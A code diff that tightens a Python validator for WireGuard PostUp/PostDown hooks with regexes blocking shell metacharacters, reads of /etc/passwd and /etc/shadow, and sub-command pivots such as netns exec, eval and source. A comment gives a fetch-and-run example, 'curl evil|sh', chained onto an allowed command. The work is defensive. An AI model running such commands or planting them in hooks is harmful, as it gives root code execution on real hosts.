@@ -43,8 +43,20 @@ __all__ = [
     "ConfigWriteError",
 ]
 
-# Regex for detecting potentially dangerous shell commands in PostUp/PostDown
-_DANGEROUS_SHELL = re.compile(r'[`$\\]|\.\.|\$\(|/etc/passwd|/etc/shadow')
+# wg-quick executes PostUp/PostDown through a shell, so anything that can
+# introduce a new command word is a root-code-execution primitive.
+# Shell metacharacters: command chaining (&&, ||, ;, &), pipes, redirection,
+# subshells/substitution, globbing and quoting.
+_SHELL_METACHARACTERS = re.compile(r'[`$\\|&<>(){}\[\]!*?\'"\n\r\t]')
+
+# Path traversal and direct reads of sensitive files.
+_DANGEROUS_SHELL = re.compile(r'\.\.|/etc/passwd|/etc/shadow')
+
+# Sub-command forms that pivot an allowlisted binary into arbitrary execution,
+# e.g. "ip netns exec ns sh" or "nft -f /attacker/file".
+_COMMAND_PIVOT = re.compile(
+    r'(?:^|\s)(?:netns\s+exec|-f|--file|-c|--command|xargs|exec|eval|source)(?:\s|$)'
+)
 
 
 class InterfaceNotFoundError(Exception):
@@ -77,7 +89,15 @@ def _validate_hook(value: str, label: str) -> str:
     if not value:
         return value
 
-    # Check for obviously dangerous patterns
+    # Reject anything that can start a new command word. A prefix allowlist
+    # alone is not a security boundary: "ip link show && curl evil|sh" starts
+    # with an allowed binary but still runs arbitrary code as root.
+    if _SHELL_METACHARACTERS.search(value):
+        raise ValueError(
+            f"Unsafe {label} hook contains shell metacharacters. "
+            "Only plain iptables/ip6tables/ip/sysctl/nft invocations separated by ';' are allowed."
+        )
+
     if _DANGEROUS_SHELL.search(value):
         raise ValueError(f"Unsafe {label} hook contains dangerous shell characters")
 
@@ -90,6 +110,11 @@ def _validate_hook(value: str, label: str) -> str:
         if not cmd.startswith(("iptables ", "ip6tables ", "ip ", "sysctl ", "nft ")):
             raise ValueError(
                 f"Unsafe {label} command: {cmd!r}. Only iptables/ip6tables/ip/sysctl/nft commands allowed."
+            )
+        # Block sub-commands that turn an allowed binary into a launcher.
+        if _COMMAND_PIVOT.search(cmd):
+            raise ValueError(
+                f"Unsafe {label} command: {cmd!r} uses a sub-command that can execute arbitrary programs."
             )
 
     return value
